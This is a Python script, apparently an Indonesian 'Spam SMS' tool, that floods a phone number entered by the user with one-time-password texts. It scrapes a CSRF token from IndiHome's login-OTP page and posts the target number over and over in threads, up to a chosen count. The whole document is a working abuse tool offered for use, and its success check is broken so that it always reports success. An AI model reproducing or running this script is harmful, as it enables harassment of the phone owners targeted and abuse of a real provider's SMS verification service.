import requests, sys, re
from concurrent.futures import ThreadPoolExecutor
 
 
def gas(no):
  s = requests.Session()
  url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
  req = s.get(url).text
  token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]
    
  data = {
  "_token":token,
  "msisdn":no
  }

  spam = s.post(url, data=data).text

  return spam

def main(cnt, no):
  jml = 0
  with ThreadPoolExecutor(max_workers=2) as e:
    futures = []
    for x in range(int(cnt)):
      futures.append(e.submit(gas, no))
    for i, future in enumerate(futures):
      jml += 1
      spam = future.result()
      if "Gagal!" or "dikirim" in spam:
        print(f"[{jml}] Spammed {no}")
      else:
        print("* ERROR *")
        sys.exit()
  print("")
 
if __name__ == '__main__':
  try:
    print("""\033[1m
   _____ __  ________
  / ___//  |/  / ___/ | Spam SMS
  \__ \/ /|_/ /\__ \  | Spam SMS menggunakan api inidihome
 ___/ / /  / /___/ /  | Code by: RidhoKode - www.ridho-code.my.id
/____/_/  /_//____/   | contoh penggunaan: 08xxxxx42\033[0m
  """)

    no = input("No    : ")
    if(no.isdigit()):
      pass
    else:
      print("Cek nomer telepon kamu!")
      sys.exit()

    if len(no) < 9:
      print("Cek nomer telepon kamu!")
      sys.exit()

    cnt = input("Count : ")

    if bool(cnt.isdigit()) == 0:
      print("Cek count kamu!")
      sys.exit()
    else:
      print("")
      main(cnt, no)
  except(KeyboardInterrupt, EOFError):
    print("\n")
    sys.exit()